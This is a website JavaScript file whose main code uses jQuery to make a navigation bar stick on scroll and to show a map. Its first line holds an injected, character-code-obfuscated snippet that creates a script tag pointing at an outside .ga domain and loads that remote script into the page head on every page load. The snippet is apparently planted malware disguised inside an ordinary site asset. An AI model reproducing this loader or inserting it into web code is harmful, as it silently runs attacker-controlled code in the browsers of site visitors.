Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();﻿/// <reference path="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.js"/>

$(function () {
    var nav = $("nav");
    var mapShown = false;

    $(window).on("scroll resize", renderNavBar)

    function renderNavBar() {
        var top = $(document.body).scrollTop() || $(document).scrollTop();
        var height = $(this).height() - nav.height();

        if (top > height) {
            nav.addClass("affix");
        }
        else {
            nav.removeClass("affix");
        }
    }

    $(window).on("scroll resize", function () {
        if (!mapShown && document.body.clientHeight > $("#con")[0].getBoundingClientRect().top) {
            mapShown = true;
            document.getElementById("main-map").style.display = "inline-block";
        }
    });

});